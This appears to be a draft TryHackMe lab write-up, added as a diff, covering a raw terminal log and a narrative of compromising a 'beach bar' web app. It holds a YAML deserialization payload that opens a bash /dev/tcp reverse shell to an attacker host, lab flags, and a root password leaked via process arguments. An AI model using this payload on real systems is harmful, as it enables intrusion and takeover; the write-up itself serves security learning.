@@ -1,0 +1,271 @@
+THM{y4ml_pl4yl1st_pwns_th3_b34ch}
+THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}  
+──(white㉿white)-[~/white/Documents/thm]
+  
+└─$ nc -lvnp  4444             
+listening on [any] 4444 ...
+connect to [192.168.129.141] from (UNKNOWN) [10.49.157.123] 41128
+bash: cannot set terminal process group (612): Inappropriate ioctl for device
+bash: no job control in this shell
+bartender@tryhackme-2404:/opt/beach-bar/webapp$ ls
+
+ls
+__pycache__
+app.py
+requirements.txt
+templates
+bartender@tryhackme-2404:/opt/beach-bar/webapp$ 
+bartender@tryhackme-2404:/opt/beach-bar/webapp$ whoami
+whoami
+bartender
+bartender@tryhackme-2404:/opt/beach-bar/webapp$ cd /home
+cd /home
+bartender@tryhackme-2404:/home$ ls
+ls
+bartender
+ubuntu
+bartender@tryhackme-2404:/home$ cd bartender     
+cd bartender
+bartender@tryhackme-2404:/home/bartender$ ls
+ls
+user.txt
+bartender@tryhackme-2404:/home/bartender$ cat user.tx 
+cat user.tx
+cat: user.tx: No such file or directory
+bartender@tryhackme-2404:/home/bartender$ cat user.txt
+cat user.txt
+THM{y4ml_pl4yl1st_pwns_th3_b34ch}
+bartender@tryhackme-2404:/home/bartender$ pa aux
+pa aux
+pa: command not found
+bartender@tryhackme-2404:/home/bartender$ px aux  
+px aux
+Command 'px' not found, but can be installed with:
+apt install px
+Please ask your administrator.
+bartender@tryhackme-2404:/home/bartender$ ps aux
+ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.1  0.3  22528 13772 ?        Ss   15:06   0:04 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    15:06   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        S    15:06   0:00 [pool_workqueue_release]
+root           4  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-rcu_gp]
+root           5  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-sync_wq]
+root           6  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-kvfree_rcu_reclaim]
+root           7  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-slub_flushwq]
+root           8  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-netns]
+root          10  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/0:0H-kblockd]
+root          11  0.0  0.0      0     0 ?        I    15:06   0:00 [kworker/0:1-events]
+root          13  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-mm_percpu_wq]
+root          14  0.0  0.0      0     0 ?        S    15:06   0:00 [ksoftirqd/0]
+root          15  0.0  0.0      0     0 ?        I    15:06   0:00 [rcu_sched]
+root          16  0.0  0.0      0     0 ?        S    15:06   0:00 [rcu_exp_par_gp_kthread_worker/0]
+root          17  0.0  0.0      0     0 ?        S    15:06   0:00 [rcu_exp_gp_kthread_worker]
+root          18  0.0  0.0      0     0 ?        S    15:06   0:00 [migration/0]
+root          19  0.0  0.0      0     0 ?        S    15:06   0:00 [kprobe-optimizer]
+root          20  0.0  0.0      0     0 ?        S    15:06   0:00 [idle_inject/0]
+root          21  0.0  0.0      0     0 ?        S    15:06   0:00 [cpuhp/0]
+root          22  0.0  0.0      0     0 ?        S    15:06   0:00 [cpuhp/1]
+root          23  0.0  0.0      0     0 ?        S    15:06   0:00 [idle_inject/1]
+root          24  0.0  0.0      0     0 ?        S    15:06   0:00 [migration/1]
+root          25  0.0  0.0      0     0 ?        S    15:06   0:00 [ksoftirqd/1]
+root          27  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/1:0H-kblockd]
+root          28  0.0  0.0      0     0 ?        S    15:06   0:00 [kdevtmpfs]
+root          29  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-inet_frag_wq]
+root          30  0.0  0.0      0     0 ?        I    15:06   0:00 [rcu_tasks_kthread]
+root          31  0.0  0.0      0     0 ?        I    15:06   0:00 [rcu_tasks_rude_kthread]
+root          32  0.0  0.0      0     0 ?        S    15:06   0:00 [kauditd]
+root          33  0.0  0.0      0     0 ?        S    15:06   0:00 [khungtaskd]
+root          34  0.0  0.0      0     0 ?        S    15:06   0:00 [oom_reaper]
+root          35  0.0  0.0      0     0 ?        I    15:06   0:00 [kworker/u8:1-flush-259:1]
+root          36  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-writeback]
+root          37  0.0  0.0      0     0 ?        I    15:06   0:00 [kworker/u8:2-events_power_efficient]
+root          38  0.0  0.0      0     0 ?        S    15:06   0:00 [kcompactd0]
+root          39  0.0  0.0      0     0 ?        SN   15:06   0:00 [ksmd]
+root          40  0.0  0.0      0     0 ?        SN   15:06   0:00 [khugepaged]
+root          41  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-kblockd]
+root          42  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-blkcg_punt_bio]
+root          43  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-kintegrityd]
+root          44  0.0  0.0      0     0 ?        S    15:06   0:00 [irq/9-acpi]
+root          46  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-tpm_dev_wq]
+root          47  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-ata_sff]
+root          48  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-md_bitmap]
+root          49  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-md_llbitmap_io]
+root          50  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-md_llbitmap_unplug]
+root          51  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-edac-poller]
+root          52  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-devfreq_wq]
+root          53  0.0  0.0      0     0 ?        S    15:06   0:00 [watchdogd]
+root          54  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-quota_events_unbound]
+root          55  0.0  0.0      0     0 ?        S    15:06   0:00 [kswapd0]
+root          56  0.0  0.0      0     0 ?        S    15:06   0:00 [ecryptfs-kthread]
+root          57  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-kthrotld]
+root          58  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-acpi_thermal_pm]
+root          59  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-nvme-wq]
+root          60  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-nvme-reset-wq]
+root          61  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-nvme-delete-wq]
+root          62  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-nvme-auth-wq]
+root          64  0.0  0.0      0     0 ?        I    15:06   0:00 [kworker/1:2-events]
+root          65  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-mld]
+root          66  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-ipv6_addrconf]
+root          67  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-kstrp]
+root          69  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/u9:0]
+root          80  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-charger_manager]
+root          81  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/0:1H-kblockd]
+root          82  0.0  0.0      0     0 ?        S    15:06   0:00 [jbd2/nvme0n1p1-8]
+root          83  0.0  0.0      0     0 ?        I<   15:06   0:00 [kworker/R-ext4-rsv-conversion]
+root         122  0.0  0.4  50540 16788 ?        S<s  15:07   0:00 /usr/lib/systemd/systemd-journald
+root         160  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-kmpathd]
+root         162  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-kmpath_handlerd]
+root         174  0.0  0.6 288960 27292 ?        SLsl 15:07   0:00 /sbin/multipathd -d -s
+root         195  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/1:1H-kblockd]
+root         207  0.0  0.1  28184  7304 ?        Ss   15:07   0:00 /usr/lib/systemd/systemd-udevd
+root         245  0.0  0.0      0     0 ?        S    15:07   0:00 [psimon]
+systemd+     270  0.0  0.3  21472 12912 ?        Ss   15:07   0:00 /usr/lib/systemd/systemd-resolved
+systemd+     276  0.0  0.2  91036  7964 ?        Ssl  15:07   0:00 /usr/lib/systemd/systemd-timesyncd
+root         295  0.0  0.0      0     0 ?        I    15:07   0:00 [kworker/u8:7-flush-259:1]
+root         398  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-ena]
+root         485  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-cfg80211]
+systemd+     545  0.0  0.2  22424 10032 ?        Ss   15:07   0:00 /usr/lib/systemd/systemd-networkd
+root         601  0.0  0.0   2728  1956 ?        Ss   15:07   0:00 /usr/sbin/acpid
+root         604  0.0  0.0   7232  2764 ?        Ss   15:07   0:00 /usr/sbin/cron -f -P
+message+     605  0.0  0.1   9620  5484 ?        Ss   15:07   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         611  0.0  0.2  20176 11692 ?        Ss   15:07   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
+root         612  0.0  0.6  34276 24352 ?        Ss   15:07   0:00 /opt/beach-bar/venv/bin/python3 /opt/beach-bar/venv/bin/gunicorn -w 2 -b 0.0.0.0:80 --user bartender --group bartender app:app
+root         615  0.0  0.5 1759344 21096 ?       Ssl  15:07   0:02 /snap/amazon-ssm-agent/13349/amazon-ssm-agent
+root         619  0.1  1.0 1851064 39976 ?       Ssl  15:07   0:02 /snap/snapd/current/usr/lib/snapd/snapd
+root         621  0.0  0.2  17632  8328 ?        Ss   15:07   0:00 /usr/lib/systemd/systemd-logind
+root         653  0.0  0.0   6156  2156 ttyS0    Ss+  15:07   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
+root         661  0.0  0.0   6112  2036 tty1     Ss+  15:07   0:00 /sbin/agetty -o -p -- \u --noclear - linux
+root         676  0.0  0.5 110008 22820 ?        Ssl  15:07   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+syslog       686  0.0  0.1 222516  6248 ?        Ssl  15:07   0:00 /usr/sbin/rsyslogd -n -iNONE
+polkitd      704  0.0  0.2 382320  8840 ?        Ssl  15:07   0:00 /usr/lib/polkit-1/polkitd --no-debug
+root         997  0.0  0.7 1990956 31300 ?       Sl   15:07   0:02 /snap/amazon-ssm-agent/13349/ssm-agent-worker
+root         999  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-tls-strp]
+root        1107  0.0  0.0      0     0 ?        S    15:07   0:00 [psimon]
+root        1132  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-ib-comp-wq]
+root        1133  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-ib-comp-unb-wq]
+root        1134  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-ib_mcast]
+root        1135  0.0  0.0      0     0 ?        I<   15:07   0:00 [kworker/R-ib_nl_sa_wq]
+root        1279  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/1:0-rcu_gp]
+root        1290  0.0  0.0      0     0 ?        I    15:26   0:00 [kworker/0:2-events]
+bartend+    1355  0.0  0.7  44024 31180 ?        S    15:31   0:00 /opt/beach-bar/venv/bin/python3 /opt/beach-bar/venv/bin/gunicorn -w 2 -b 0.0.0.0:80 --user bartender --group bartender app:app
+bartend+    1427  0.0  0.0   2808  1856 ?        S    15:48   0:00 sh -c -- bash -c 'bash -i >& /dev/tcp/192.168.129.141/4444 0>&1'
+bartend+    1428  0.0  0.0   7748  3648 ?        S    15:48   0:00 bash -c bash -i >& /dev/tcp/192.168.129.141/4444 0>&1
+bartend+    1429  0.0  0.1   8952  5292 ?        S    15:48   0:00 bash -i
+bartend+    1442  0.0  0.7  43696 30556 ?        S    15:48   0:00 /opt/beach-bar/venv/bin/python3 /opt/beach-bar/venv/bin/gunicorn -w 2 -b 0.0.0.0:80 --user bartender --group bartender app:app
+bartend+    1476  100  0.1  11328  4480 ?        R    15:52   0:00 ps aux
+bartender@tryhackme-2404:/home/bartender$ python3 jukeboxd.py --password SuperSecretRootPassword123
+<3 jukeboxd.py --password SuperSecretRootPassword123
+python3: can't open file '/home/bartender/jukeboxd.py': [Errno 2] No such file or directory
+bartender@tryhackme-2404:/home/bartender$ ls
+ls
+user.txt
+bartender@tryhackme-2404:/home/bartender$ cd ..
+cd ..
+bartender@tryhackme-2404:/home$ ls
+ls
+bartender
+ubuntu
+bartender@tryhackme-2404:/home$ find jukeboxd.py
+find jukeboxd.py
+find: ‘jukeboxd.py’: No such file or directory
+bartender@tryhackme-2404:/home$ ps aus | grep jukeboxd
+ps aus | grep jukeboxd
+error: conflicting format options
+
+Usage:
+ ps [options]
+
+ Try 'ps --help <simple|list|output|threads|misc|all>'
+  or 'ps --help <s|l|o|t|m|a>'
+ for additional help text.
+
+For more details see ps(1).
+bartender@tryhackme-2404:/home$ ps aux | grep  "jukeboxd"
+ps aux | grep  "jukeboxd"
+root         611  0.0  0.2  20176 11692 ?        Ss   15:07   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
+bartend+    1492  0.0  0.0   7088  2172 ?        S    15:56   0:00 grep --color=auto jukeboxd
+bartender@tryhackme-2404:/home$ su root
+su root
+Password: python3 jukeboxd.py --password SuperSecretRootPassword123
+su: Authentication failure
+bartender@tryhackme-2404:/home$ su root
+su root
+Password: SuperSecretRootPassword123
+su: Authentication failure
+bartender@tryhackme-2404:/home$  SunsetSpritz2024!
+ SunsetSpritz2024!
+SunsetSpritz2024!: command not found
+bartender@tryhackme-2404:/home$ su root
+su root
+Password:  SunsetSpritz2024!    
+su: Authentication failure
+bartender@tryhackme-2404:/home$ SunsetSpritz2024!
+SunsetSpritz2024!
+SunsetSpritz2024!: command not found
+bartender@tryhackme-2404:/home$ su roor
+su roor
+su: user roor does not exist or the user entry does not contain all the required fields
+bartender@tryhackme-2404:/home$ su root 
+su root
+Password: SunsetSpritz2024!
+
+ls
+bartender
+Getting a Reverse Shell
+I started a listener on my attack machine:
+
+nc -lvnp 4444
+I then replaced the harmless id command with a Bash reverse shell. The screenshots use my lab address, but the reusable form of the payload is:
+
+!!python/object/apply:os.system
+- "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
+Malicious YAML containing the reverse-shell command
+
+Loading the playlist caused the server to connect back to my listener and gave me a shell as bartender.
+
+Netcat receiving a reverse shell from the target
+
+I enumerated the home directories and found the first flag in /home/bartender/user.txt:
+
+ls /home
+ls /home/bartender
+cat /home/bartender/user.txt
+Retrieving the masked user flag from the bartender home directory
+
+Privilege Escalation
+The privilege-escalation path took me considerably longer to find, though it was stupidly simple in hindsight. I eventually transferred and ran linPEAS, which drew my attention to the target’s running processes.
+
+A Python service named jukeboxd.py was running as root. More importantly, its command line included the root password in plaintext. The same information can be inspected manually with a command such as:
+
+ps aux
+Root-owned jukeboxd process exposing its stream password in a command-line argument
+
+Process arguments are normally visible to other local users on Linux. Passing a secret as a command-line argument therefore exposes it through tools such as ps and often through /proc/<PID>/cmdline as well.
+
+With the leaked password, I switched to the root account:
+
+su root
+whoami
+cat /root/root.txt
+whoami returned root, and the second flag was waiting in /root/root.txt.
+
+Using the leaked password to become root and retrieve the masked root flag
+
+Why the Exploit Chain Worked
+The room combined three separate security mistakes:
+
+Credentials left in HTML source
+              ↓
+Authenticated playlist importer
+              ↓
+Unsafe YAML deserialization
+              ↓
+Command execution as bartender
+              ↓
+Root password visible in a process command
+              ↓
+Root access
+The first issue exposed an account, but the account alone did not provide shell access. The second issue turned access to the playlist importer into arbitrary command execution. The final issue converted a low-privileged shell into full control of the host.
+
+
